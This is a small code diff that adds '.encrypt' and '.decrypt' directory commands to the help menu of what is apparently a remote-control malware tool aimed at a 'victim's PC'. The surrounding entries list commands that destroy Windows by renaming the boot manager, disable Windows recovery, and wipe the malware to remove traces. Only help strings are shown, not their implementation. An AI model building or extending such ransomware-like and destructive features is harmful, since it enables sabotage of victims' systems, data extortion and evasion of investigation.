@@ -422,6 +422,8 @@ help = {
         'winbreak': ['➡️ `.winbreak`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
         'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
         'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
+        'encrypt': ['➡️ `.encrypt <directory>`', 'Encrypts every file in the specified directory'],
+        'decrypt': ['➡️ `.decrypt <directory>`', 'Decrypts every file in the specified directory'],
         'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
     }
 }
